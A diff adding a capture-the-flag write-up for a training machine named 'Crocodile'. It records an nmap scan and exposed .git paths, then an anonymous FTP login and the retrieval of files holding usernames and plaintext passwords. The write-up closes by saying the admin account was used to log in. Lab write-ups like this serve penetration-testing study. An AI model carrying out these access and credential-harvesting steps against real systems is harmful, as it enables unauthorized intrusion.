@@ -1,0 +1,62 @@
+Crocodile Lab Report:
+
+Nmap Scan Report:
+
+21/tcp open  ftp     vsftpd 3.0.3
+  ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+
+Findings:
+    
+  The application uses:
+    Bootstrap
+    jQuery
+    DataTables
+    SB Admin 2 template
+    Chart.js assets
+
+  Discovered:
+    /dashboard/.git/HEAD
+    /dashboard/.git/config
+    /dashboard/.git/index
+    /dashboard/.git/logs/HEAD
+    .git/index file is especially notable because it indicates the Git metadata is publicly accessible.
+    /dashboard/ exists and redirects unauthenticated users to login.php
+    
+    
+Exploit:
+
+  >ftp 10.129.53.44
+  Connected to 10.129.53.44.
+  220 (vsFTPd 3.0.3)
+  >Name (10.129.53.44:mrshadow): anonymous
+  230 Login successful.
+  Remote system type is UNIX.
+  
+  Used anonymous login which required no password (ie. username:anonymous pass:None)
+  
+  ftp> dir
+  229 Entering Extended Passive Mode (|||46611|)
+  150 Here comes the directory listing.
+  -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+  -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+  226 Directory send OK.
+  
+  The currect working directory had two sensitive files named allowed.userlist and allowed.userlist.passwd which contained the usernames and passwords.
+  
+  >cat allowed.userlist           
+    aron
+    pwnmeow
+    egotisticalsw
+    admin
+    
+  >cat allowed.userlist.passwd
+    root
+    Supersecretpassword1
+    @BaASD&9032123sADS
+    rKXM59ESxesUFHAd
+    
+   The admin username seems to be the high priveledged account so tried that username with the passwords we have and successfully logged into the account and captured the flag. 
+
